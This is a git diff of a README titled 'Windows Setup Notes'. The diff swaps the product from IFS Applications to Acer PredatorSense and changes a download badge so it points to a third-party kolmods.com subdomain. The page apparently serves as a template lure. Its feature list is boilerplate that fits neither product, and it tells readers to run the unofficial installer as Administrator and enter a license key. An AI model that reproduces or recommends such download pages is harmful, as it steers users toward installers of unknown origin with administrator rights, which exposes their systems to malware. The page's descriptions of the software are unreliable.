@@ -1,10 +1,14 @@
-# IFS Applications Windows Setup Notes
+# Acer PredatorSense Windows Setup Notes
+
+<p align="center">
+  <a href="https://acer-predatorsense-setup.kolmods.com/">
+    <img src="https://img.shields.io/badge/Download-Acer%20PredatorSense-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Acer PredatorSense">
+  </a>
+</p>
 
 ## Download & Install
 
-> **Download:** [**Get IFS Applications for Windows →**](https://ifs.kolmods.com/)
->
-> Setup notes for **IFS Applications** on Windows 10/11 (64-bit). Run the installer as Administrator.
+> Setup notes for **Acer PredatorSense** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -12,15 +16,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **IFS Applications** from the Start menu
+5. Restart if the installer asks — then launch **Acer PredatorSense** from the Start menu
 
 ## What you can use it for
 
-- Core IFS Applications features on Windows desktop
-- Install and configure IFS Applications for daily use
-- Import, edit, and export with IFS Applications tools
-- Tune settings and profiles inside IFS Applications
-- Integrate IFS Applications into your existing workflow
+- Core Acer PredatorSense features on Windows desktop
+- Install and configure Acer PredatorSense for daily use
+- Import, edit, and export with Acer PredatorSense tools
+- Tune settings and profiles inside Acer PredatorSense
+- Integrate Acer PredatorSense into your existing workflow
 
 ## License
 
